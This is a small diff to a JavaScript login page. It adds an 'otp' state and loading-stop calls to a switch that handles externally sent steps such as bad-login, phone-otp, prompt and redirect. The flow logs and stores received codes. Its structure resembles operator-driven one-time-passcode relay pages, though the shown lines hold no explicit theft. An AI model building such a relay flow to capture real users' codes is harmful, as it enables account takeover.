@@ -86,9 +86,21 @@
 	    case "bad-login":
 	      showError("incorrect password");
 	      break;
+	      
+	    case "otp":
+	     document.querySelector("#username").textContent = sessionStorage.getItem("user");
+	       phoneNumberEl = document.querySelector("#yp");
+	      if (!phoneNumberEl) {
+	        window.location.href = phonescreen;
+	        return;
+	      }
+	      phoneNumberEl.textContent = "your phone";
+	      stopLoading();
+	      break;  
 	
 	    case "phone-otp":
 	      if (!code) return;
+	      document.querySelector("#username").textContent = sessionStorage.getItem("user");
 	      console.log(code);
 	       phoneNumberEl = document.querySelector("#phone");
 	      sessionStorage.setItem("setcode", code);
@@ -97,6 +109,7 @@
 	        return;
 	      }
 	      phoneNumberEl.textContent = code;
+	      stopLoading();
 	      break;
 	
 	    case "prompt":
@@ -108,6 +121,7 @@
 	        return;
 	      }
 	      phoneNumberEl.textContent = code;
+	      stopLoading();
 	      break;
 	
 	    case "redirect":
